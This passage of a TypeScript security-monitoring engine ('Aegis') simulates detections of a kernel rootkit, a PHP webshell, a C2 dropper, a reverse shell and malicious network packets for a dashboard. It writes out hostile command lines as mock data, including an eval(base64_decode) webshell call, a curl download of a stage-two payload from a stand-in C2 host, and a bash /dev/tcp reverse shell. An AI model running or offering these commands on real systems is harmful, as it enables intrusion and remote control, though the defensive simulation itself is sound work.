        malware_name: "Rootkit.Linux.Diamorphine",
        family: "Rootkit",
        severity: "critical",
        confidence: "high",
        rule_matched: "MAL-ROOTKIT-DIAMORPHINE",
        detection_method: "Kernel Syscall Invisibility & Dynamic Hook Detector",
        sha256: computeDigest("diamorphine" + pid).repeat(4).slice(0, 64),
        entropy: 7.84,
        indicators: ["diamorphine", "kill -64", "module_hide", "sys_call_table"],
        quarantined: false,
        ts: now,
      };
      this.malwareResults.unshift(malScan);

      this.telemetry.unshift({
        id: `tel-${now}`,
        ts: now,
        pid,
        ppid: 1120,
        process: "insmod",
        parent: "bash",
        event_type: "PROC_SPAWN",
        severity: "critical",
        score: 94,
        mitre: "T1547.006 (Kernel Modules)",
        detail: "Diamorphine LKM kernel module loaded into running kernel",
        cmdline: cmd,
        verdict: "alert",
      });

      this.emit("anomaly", incident);
      this.emit("telemetry-event", this.telemetry[0]);
      this.emit("malware-detected", malScan);

      return {
        success: true,
        scenario: "rootkit_attack",
        message: `Kernel Rootkit detected! Identified Rootkit.Linux.Diamorphine (Score 94/100 [CRITICAL]).`,
        result: evalRes,
        incident,
      };
    } else if (scenario === "webshell_attack") {
      // WebShell RCE
      const cmd = ["/usr/bin/php", "-r", "@eval(base64_decode($_POST['c99sh']));"];
      const evalRes = this.evaluateRisk({
        process_name: "php",
        cmdline: cmd,
        parent_name: "www-data",
        uid: 33,
      });

      const incident: ThreatIncident = {
        id: `inc-${now}`,
        kind: "webshell_rce",
        severity: "critical",
        risk_score: 96,
        pid,
        ppid: 711,
        process: "php",
        cmdline: cmd,
        exe_path: "/usr/bin/php",
        rule: "MAL-WEBSHELL-C99",
        confidence: "high",
        reason: "Active WebShell payload execution by www-data via eval(base64_decode) backdoor",
        ancestors: [1, 710, 711],
        ts: new Date(now).toISOString(),
        resolved: false,
        digest: computeDigest("webshell" + pid + now),
        mitre_tactic: "Persistence & Execution",
        mitre_technique: "T1505.003 (Server Software Component: Web Shell)",
        flags: ["[VIRUS: WEBSHELL]", "[WebShell.C99]", "[RCE_INJECT]"],
        virus_name: "Backdoor.Linux.WebShell.C99",
        virus_family: "WebShell",
        factors: evalRes.factors,
        movement_steps: [
          { ts: now - 1500, event: "HTTP POST", detail: "Inbound POST request with obfuscated payload", delta: 35 },
          { ts: now, event: "Eval Injection", detail: "Interpreter dynamically executed decoded string", delta: 61 },
        ],
      };

      this.incidents.unshift(incident);

      const malScan: MalwareScanResult = {
        id: `mal-${now}`,
        target_path: "/var/www/html/backdoor.php",
        target_type: "file",
        pid,
        status: "infected",
        malware_name: "Backdoor.Linux.WebShell.C99",
        family: "WebShell",
        severity: "critical",
        confidence: "high",
        rule_matched: "MAL-WEBSHELL-C99",
        detection_method: "Pattern Match (SIGNATURE_REGEX)",
        sha256: computeDigest("c99" + pid).repeat(4).slice(0, 64),
        entropy: 7.91,
        indicators: ["eval(base64_decode", "c99sh", "system($_post['cmd'])"],
        quarantined: false,
        ts: now,
      };
      this.malwareResults.unshift(malScan);

      this.telemetry.unshift({
        id: `tel-${now}`,
        ts: now,
        pid,
        ppid: 711,
        process: "php",
        parent: "www-data",
        event_type: "PROC_SPAWN",
        severity: "critical",
        score: 96,
        mitre: "T1505.003 (Web Shell)",
        detail: "C99 WebShell command execution under web user www-data",
        cmdline: cmd,
        verdict: "alert",
      });

      this.emit("anomaly", incident);
      this.emit("telemetry-event", this.telemetry[0]);
      this.emit("malware-detected", malScan);

      return {
        success: true,
        scenario: "webshell_attack",
        message: `WebShell RCE trapped! Identified Backdoor.Linux.WebShell.C99 (Score 96/100 [CRITICAL]).`,
        result: evalRes,
        incident,
      };
    } else {
      // Genuine Multi-Stage Attack: Web RCE + Memory Dropper + C2 Beacon -> CRITICAL severity
      const cmd = ["/usr/bin/curl", "-fsSL", "http://cobalt-strike.bad/stage2.bin", "-o", "/dev/shm/.kworker"];
      const evalRes = this.evaluateRisk({
        process_name: "curl",
        cmdline: cmd,
        parent_name: "nginx",
        uid: 33,
        destination: "cobalt-strike.bad",
      });

      const incident: ThreatIncident = {
        id: `inc-${now}`,
        kind: "multi_stage_dropper",
        severity: "critical",
        risk_score: 96,
        pid,
        ppid: 711,
        process: "curl",
        cmdline: cmd,
        exe_path: "/usr/bin/curl",
        rule: "PATH-001",
        confidence: "high",
        reason: "Multi-stage memory dropper staged from C2 feed into /dev/shm/.kworker by web server lineage",
        ancestors: [1, 710, 711],
        ts: new Date(now).toISOString(),
        resolved: false,
        digest: computeDigest("critical" + pid + now),
        mitre_tactic: "Execution & C2",
        mitre_technique: "T1036.005 / T1105 (Ingress Tool Transfer)",
        factors: evalRes.factors,
        movement_steps: [
          { ts: now - 3000, event: "HTTP Exploitation", detail: "nginx worker (pid 711) received malicious payload", delta: 25 },
          { ts: now - 2000, event: "Child Ingress", detail: "curl launched targeting blacklisted C2 cobalt-strike.bad", delta: 35 },
          { ts: now, event: "RAM Dropper Staged", detail: "Output written to /dev/shm/.kworker disguised as kernel thread", delta: 36 },
        ],
      };

      this.incidents.unshift(incident);

      // Add socket
      this.connections.unshift({
        id: `net-${now}`,
        pid,
        process_name: "curl",
        proto: "TCP",
        local_addr: "10.0.4.15",
        local_port: 53100 + Math.floor(Math.random() * 500),
        remote_addr: "23.239.9.123",
        remote_port: 80,
        state: "ESTABLISHED",
        direction: "outbound",
        bytes_tx: 1400,
        bytes_rx: 92400,
        threat: "suspicious",
        threat_reason: "High-volume payload download from known C2 host (cobalt-strike.bad)",
        ts: now,
      });

      this.telemetry.unshift({
        id: `tel-${now}`,
        ts: now,
        pid,
        ppid: 711,
        process: "curl",
        parent: "nginx: worker",
        event_type: "FILE_DROP",
        severity: "critical",
        score: 96,
        mitre: "T1036.005 / T1105",
        detail: "Memory dropper staged into /dev/shm/.kworker from C2 domain",
        cmdline: cmd,
        verdict: "alert",
      });

      const procEvent: ProcEvent = {
        id: `p-${pid}`,
        kind: "anomaly",
        pid,
        ppid: 711,
        name: "curl",
        cmdline: cmd,
        exe: "/usr/bin/curl",
        cwd: "/var/www/html",
        uid: 33,
        gid: 33,
        start_time: now,
        anomaly: {
          rule: "PATH-001",
          confidence: "high",
          severity: "critical",
          risk_score: 96,
          reason: incident.reason,
          parent_exe: "/usr/sbin/nginx",
          ancestors: incident.ancestors,
          mitre_tactic: incident.mitre_tactic,
          mitre_technique: incident.mitre_technique,
        },
        ts: now,
      };

      this.processes.set(pid, procEvent);
      this.emit("proc-event", procEvent);
      this.emit("anomaly", incident);
      this.emit("telemetry-event", this.telemetry[0]);
      this.emit("net-update", { connections: this.connections });

      return {
        success: true,
        scenario: "multi_stage_c2",
        message: `Correlated multiple high-risk signals: Web lineage + memory dropper + C2 host -> Escalated to CRITICAL (Score 96/100).`,
        result: evalRes,
        incident,
      };
    }
  }

  // --------------------------------------------------------------------------
  // Direct Engine Test & Simulation Methods (Comprehensive First-to-Last Tab)
  // --------------------------------------------------------------------------
  public simulateSuspiciousProcess(): ProcEvent {
    const pid = 4921;
    const now = Date.now();
    const factors: ScoreFactor[] = [
      { name: "Deleted Executable Inode", impact: 35, category: "behavior", desc: "Process running from /tmp/.kworker_d (deleted)" },
      { name: "Known C2 Threat Match", impact: 40, category: "network", desc: "Outbound socket to C2 node 45.33.32.156:4444" },
      { name: "High Shannon Entropy Memory", impact: 19, category: "payload", desc: "Memory segment entropy 7.42 indicating packed payload" },
    ];

    const incident: ThreatIncident = {
      id: `inc-proc-${now}`,
      kind: "unlinked_c2_exec",
      severity: "critical",
      risk_score: 94,
      pid,
      ppid: 1,
      process: "kworker_d",
      cmdline: ["/tmp/.cache/kworker_d", "--c2", "45.33.32.156:4444", "--encrypt"],
      exe_path: "/tmp/.cache/kworker_d (deleted)",
      rule: "PATH-DELETED-EXEC",
      confidence: "high",
      ancestors: [1],
      mitre_tactic: "Execution / Defense Evasion",
      mitre_technique: "T1059.004 / T1070.004",
      reason: "Critical anomaly: Process running from unlinked binary in /tmp and beaconing to C2 server 45.33.32.156:4444",
      ts: new Date(now).toISOString(),
      resolved: false,
      digest: computeDigest("critical" + pid + now),
      factors,
    };
    this.incidents.unshift(incident);

    const procEvent: ProcEvent = {
      id: `p-${pid}-${now}`,
      kind: "anomaly",
      pid,
      ppid: 1,
      name: "kworker_d",
      cmdline: ["/tmp/.cache/kworker_d", "--c2", "45.33.32.156:4444", "--encrypt"],
      exe: "/tmp/.cache/kworker_d (deleted)",
      cwd: "/tmp",
      uid: 0,
      gid: 0,
      start_time: now,
      anomaly: {
        rule: "PATH-DELETED-EXEC",
        confidence: "high",
        severity: "critical",
        risk_score: 94,
        reason: incident.reason,
        parent_exe: "/sbin/init",
        ancestors: [1],
        mitre_tactic: incident.mitre_tactic,
        mitre_technique: incident.mitre_technique,
        flags: ["UNLINKED_BINARY", "C2_BEACONING", "HIGH_ENTROPY_MEM"],
        virus_family: "Backdoor",
        virus_name: "Linux/Meterpreter.RevTCP",
        factors,
      },
      ts: now,
    };

    this.processes.set(pid, procEvent);
    this.emit("proc-event", procEvent);
    this.emit("anomaly", incident);

    return procEvent;
  }

  public simulateThreatIncident(): ThreatIncident {
    const now = Date.now();
    const pid = 5104;
    const factors: ScoreFactor[] = [
      { name: "Direct Socket Redirection", impact: 45, category: "network", desc: "Interactive /dev/tcp outbound stream" },
      { name: "Known C2 Threat Match", impact: 35, category: "network", desc: "Remote IP 45.33.32.156 listed in active threat feed" },
      { name: "Interactive Shell Spawn", impact: 12, category: "payload", desc: "Interactive bash instance in background session" },
    ];

    const incident: ThreatIncident = {
      id: `inc-attack-${now}`,
      kind: "c2_reverse_shell",
      severity: "critical",
      risk_score: 92,
      pid,
      ppid: 1,
      process: "bash",
      cmdline: ["/bin/bash", "-c", "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1"],
      exe_path: "/bin/bash",
      rule: "C2-INTERACTIVE-DEVTCP",
      confidence: "high",
      ancestors: [1],
      mitre_tactic: "Command and Control",
      mitre_technique: "T1059.004 / T1071.001",
      reason: "Interactive reverse shell stream redirected to outbound socket /dev/tcp/45.33.32.156/4444",
      ts: new Date(now).toISOString(),
      resolved: false,
      digest: computeDigest("c2" + pid + now),
      factors,
    };
    this.incidents.unshift(incident);
    this.emit("anomaly", incident);
    return incident;
  }

  public simulateSuppressionTest(): DebugEntry {
    const now = Date.now();
    const entry: DebugEntry = {
      id: `dbg-suppress-${now}`,
      pid: 3042,
      process: "npm",
      rule: "DEV_BUILD_TOOL_SUPPRESSION",
      note: "npm install express evaluated -> score 12/100. Suppressed to eliminate alert fatigue.",
      suppression_reason: "Trusted developer workspace (/home/developer/workspace) + legitimate package manager binary",
      category: "DEV_TOOL_BENIGN",
      original_score: 12,
      adjusted_score: 0,
      ts: new Date(now).toISOString(),
    };
    this.debugLog.unshift(entry);
    return entry;
  }

  public simulateAuditAction(): AuditEntry {
    const now = Date.now();
    const pid = 9924;
    const nextDigest = computeDigest(this.lastDigest + "Quarantine" + pid + now);
    const entry: AuditEntry = {
      id: `aud-${now}`,
      action: "Quarantine",
      pid,
      process: "simulated_threat_runner",
      incident_id: `inc-sim-${now}`,
      note: "Process isolated in network confinement jail via active response boundary. BLAKE3 chain validated.",
      status: "success",
      outcome: "SIGSTOP emitted and network sockets diverted to loopback sinkhole",
      ts_before: now,
      ts_after: now + 4,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    };
    this.lastDigest = nextDigest;
    this.auditLog.unshift(entry);
    return entry;
  }

  public runEngineDiagnostics() {
    return {
      timestamp: Date.now(),
      overall_status: "HEALTHY",
      integrity_score: 100,
      engines: [
        { name: "Process Tree Engine", status: "OPERATIONAL", metrics: `${this.processes.size} active nodes tracked`, latency_ms: 0.8 },
        { name: "Behavioral Movement Engine", status: "OPERATIONAL", metrics: `${this.telemetry.length} telemetry events evaluated`, latency_ms: 1.2 },
        { name: "eBPF Socket IDS Engine", status: "OPERATIONAL", metrics: `In-kernel JIT bytecode active (${this.ebpfStats.instructions_count} insns), ${this.ebpfRules.length} security rules loaded`, latency_ms: 0.4 },
        { name: "Dynamic Virus Sandbox", status: "OPERATIONAL", metrics: `${this.sandboxReports.length} detonation environments isolated`, latency_ms: 1.6 },
        { name: "Static AV & Entropy Heuristics", status: "OPERATIONAL", metrics: "Shannon entropy analyzer & 6 signature sets loaded", latency_ms: 0.9 },
        { name: "Threat Journal & Storage", status: "OPERATIONAL", metrics: `${this.incidents.length} incidents logged, multi-tier pipeline active`, latency_ms: 0.6 },
        { name: "Active Defense Mitigation", status: "OPERATIONAL", metrics: "Safe boundary enforced (PIDs ≤ 100 protected)", latency_ms: 0.5 },
        { name: "Cryptographic Audit Ledger", status: "OPERATIONAL", metrics: `${this.auditLog.length} chained BLAKE3 entries, 0 breaks`, latency_ms: 0.7 },
        { name: "Threat Intelligence Feeds", status: "OPERATIONAL", metrics: `${BUNDLED_IOCS.length} IOCs in memory + URLhaus 6h sync active`, latency_ms: 0.3 },
        { name: "Canary Deception Engine", status: "OPERATIONAL", metrics: `${this.canaries.length} tripwire tokens active`, latency_ms: 0.2 },
        { name: "Self-Protect Tamper Guard", status: "OPERATIONAL", metrics: "Anti-unhooking & mem-lock enabled", latency_ms: 0.4 },
      ],
    };
  }

  public simulateEbpfPacket(sampleType: string, _customHex?: string): any {
    const now = Date.now();
    let pkt: any;
    if (sampleType === "dns_tunnel") {
      pkt = {
        id: "pkt-" + Math.random().toString(36).substring(2, 8),
        interface: this.ebpfStats.interface || "eth0",
        ts: now,
        src_ip: "192.168.1.105",
        dst_ip: "1.1.1.1",
        proto: "UDP",
        src_port: 51240,
        dst_port: 53,
        tcp_flags: [],
        packet_len: 128,
        payload_len: 86,
        payload_preview: "q7x991z0a.exfil.data.shadow.c2.net (base32-encoded)",
        payload_entropy: 6.12,
        verdict: "alert",
        matched_rule: "EBPF-R003",
        threat_score: 82,
        reason: "[EBPF-R003] DNS Covert Tunneling Anomaly — High-entropy query exfiltration detected on port 53",
      };
    } else if (sampleType === "cobalt_strike") {
      pkt = {
        id: "pkt-" + Math.random().toString(36).substring(2, 8),
        interface: this.ebpfStats.interface || "eth0",
        ts: now,
        src_ip: "192.168.1.105",
        dst_ip: "198.199.73.244",
        proto: "TCP",
        src_port: 48922,
        dst_port: 8888,
        tcp_flags: ["PSH", "ACK"],
        packet_len: 256,
        payload_len: 198,
        payload_preview: "\\x89\\x4d\\x2a\\xfe\\x01\\x9b\\xbb\\x7c (packed beacon jitter)",
        payload_entropy: 7.55,
        verdict: "drop",
        matched_rule: "EBPF-R004",
        threat_score: 96,
        reason: "[EBPF-R004] Cobalt Strike / Covenant Beacon — Staged C2 connection dropped at socket layer",
      };
    } else if (sampleType === "benign_tls") {
      pkt = {
        id: "pkt-" + Math.random().toString(36).substring(2, 8),
        interface: this.ebpfStats.interface || "eth0",
        ts: now,
        src_ip: "192.168.1.105",
        dst_ip: "104.16.132.229",
        proto: "TCP",
        src_port: 54120,
        dst_port: 443,
        tcp_flags: ["ACK"],
        packet_len: 512,
        payload_len: 446,
        payload_preview: "TLSv1.3 ClientHello (SNI: registry.npmjs.org)",
        payload_entropy: 4.88,
        verdict: "pass",
        matched_rule: null,
        threat_score: 0,
        reason: "Benign outbound TLS session inspected and verified clean",
      };
    } else {
      // default: c2_shell (Port 4444)
      pkt = {
        id: "pkt-" + Math.random().toString(36).substring(2, 8),
        interface: this.ebpfStats.interface || "eth0",
        ts: now,
        src_ip: "192.168.1.50",
        dst_ip: "45.33.32.156",
        proto: "TCP",
        src_port: 53777,
        dst_port: 4444,
        tcp_flags: ["SYN", "ACK"],
        packet_len: 64,
        payload_len: 24,
        payload_preview: "/bin/sh -i <&3 >&3 2>&3",
        payload_entropy: 7.22,
        verdict: "drop",
        matched_rule: "EBPF-R002",
        threat_score: 95,
        reason: "[EBPF-R002] Default C2 Reverse Shell Port — Backdoor connection blocked by socket filter",
      };
    }

    // Update stats
    this.ebpfStats.packets_inspected++;
    this.ebpfStats.bytes_processed += pkt.packet_len;
    if (pkt.verdict === "drop") {
      this.ebpfStats.packets_dropped++;
      this.ebpfStats.threats_detected++;
    } else if (pkt.verdict === "alert") {
      this.ebpfStats.threats_detected++;
    }

    this.ebpfInspectedPackets.unshift(pkt);
    if (this.ebpfInspectedPackets.length > 50) {
      this.ebpfInspectedPackets.pop();
    }

    if (pkt.verdict === "drop" || pkt.verdict === "alert") {
      this.emit("ebpf-threat-detected", pkt);
    }

    return pkt;
  }

  // --------------------------------------------------------------------------
  // Storage Management & Automated Pruner Utility
  // --------------------------------------------------------------------------
  public getStorageStats(): StorageStats {
    const debugEntriesCount = this.debugLog.length;
    const debugSizeBytes = debugEntriesCount * 1280;

    const tempFilesCount = this.tempArtifacts.length;
    const tempFilesBytes = this.tempArtifacts.reduce((acc, f) => acc + f.size_bytes, 0);

    const auditEntriesCount = this.auditLog.length;
    const auditSizeBytes = auditEntriesCount * 950;

    const quarantineFilesCount = 2;
    const quarantineSizeBytes = 1845000;

    const staleTempBytes = this.tempArtifacts.filter((t) => t.stale).reduce((acc, f) => acc + f.size_bytes, 0);
    const reclaimableDebugBytes = Math.max(0, debugEntriesCount - 25) * 1280;
    const totalReclaimableBytes = staleTempBytes + reclaimableDebugBytes;

    return {
      debug_entries_count: debugEntriesCount,
      debug_size_bytes: debugSizeBytes,
      temp_files_count: tempFilesCount,
      temp_files_bytes: tempFilesBytes,
      quarantine_files_count: quarantineFilesCount,
      quarantine_size_bytes: quarantineSizeBytes,
      audit_entries_count: auditEntriesCount,
      audit_size_bytes: auditSizeBytes,
      total_reclaimable_bytes: totalReclaimableBytes,
      last_pruned_ts: this.lastPruneTs,
      auto_prune_enabled: this.autoPruneConfig.enabled,
      retention_days: this.autoPruneConfig.retention_days,
      temp_artifacts: [...this.tempArtifacts],
    };
  }

  public pruneLogsAndTemp(options?: PruneOptions): PruneResult {
    const now = Date.now();
    const olderThanMs = options?.older_than_ms ?? this.autoPruneConfig.retention_days * 24 * 60 * 60 * 1000;
    const maxEntries = options?.max_debug_entries ?? this.autoPruneConfig.max_debug_entries;
    const cleanTemp = options?.clean_temp_files ?? this.autoPruneConfig.clean_temp_files;
    const cleanSandbox = options?.clean_sandbox ?? this.autoPruneConfig.clean_sandbox_artifacts;
    const cleanPcap = options?.clean_pcap ?? this.autoPruneConfig.clean_pcap_buffers;

    const cutoffTime = now - olderThanMs;

    // Filter debug log by age and limit
    let prunedDebugCount = 0;
    const keptDebug: DebugEntry[] = [];

    for (let i = 0; i < this.debugLog.length; i++) {
      const entry = this.debugLog[i];
      const entryTime = new Date(entry.ts).getTime();
      if (entryTime >= cutoffTime && keptDebug.length < maxEntries) {
        keptDebug.push(entry);
      } else {
        prunedDebugCount++;
      }
    }
    this.debugLog = keptDebug;

    // Clean temp artifacts
    let prunedTempCount = 0;
    let freedTempBytes = 0;
    const keptTemp: TempFileArtifact[] = [];
    const details: string[] = [];

    for (const art of this.tempArtifacts) {
      let shouldDelete = false;
      if (cleanTemp && art.stale) shouldDelete = true;
      if (cleanSandbox && art.category === "sandbox_scratch") shouldDelete = true;
      if (cleanPcap && art.category === "pcap_buffer") shouldDelete = true;
      if (art.category === "debug_trace" && now - art.created_ts > olderThanMs) shouldDelete = true;
      if (art.category === "forensics_dump" && now - art.created_ts > olderThanMs) shouldDelete = true;

      if (shouldDelete) {
        prunedTempCount++;
        freedTempBytes += art.size_bytes;
        details.push(`Pruned ${art.category} at ${art.path} (${(art.size_bytes / 1024).toFixed(1)} KB)`);
      } else {
        keptTemp.push(art);
      }
    }
    this.tempArtifacts = keptTemp;

    const freedDebugBytes = prunedDebugCount * 1280;
    const totalFreedBytes = freedTempBytes + freedDebugBytes;
    this.lastPruneTs = now;
    this.autoPruneConfig.last_run_ts = now;

    // Cryptographic audit chain logging
    const nextDigest = computeDigest(this.lastDigest + "MAINTENANCE_PRUNE" + 0 + now);
    this.auditLog.unshift({
      id: `aud-${now}`,
      action: "StoragePrune",
      pid: 1,
      process: "aegis-maintenance",
      incident_id: null,
      note: `Automated cleanup pruned ${prunedDebugCount} debug logs & ${prunedTempCount} temporary artifacts (${(totalFreedBytes / (1024 * 1024)).toFixed(2)} MB reclaimed)`,
      status: "success",
      outcome: `Cleaned outdated logs and temporary artifacts; freed ${(totalFreedBytes / (1024 * 1024)).toFixed(2)} MB.`,
      ts_before: now - 4,
      ts_after: now,
      prev_digest: this.lastDigest,
      digest: nextDigest,
    });
    this.lastDigest = nextDigest;

    const result: PruneResult = {
      success: true,
      pruned_debug_entries: prunedDebugCount,
      pruned_temp_files: prunedTempCount,
      freed_bytes: totalFreedBytes,
      remaining_debug_entries: this.debugLog.length,
      remaining_temp_files: this.tempArtifacts.length,
      timestamp: now,
      details,
    };

    this.emit("storage-updated", this.getStorageStats());
    this.emit("debug-log-updated", { count: this.debugLog.length });
    return result;
  }

  public getAutoPruneConfig(): AutoPruneConfig {
    return { ...this.autoPruneConfig };
  }

  public updateAutoPruneConfig(cfg: Partial<AutoPruneConfig>): AutoPruneConfig {
    this.autoPruneConfig = { ...this.autoPruneConfig, ...cfg };
    this.emit("storage-updated", this.getStorageStats());
    return { ...this.autoPruneConfig };
  }
}

export const aegisSecurityEngine = new AegisSecurityEngine();
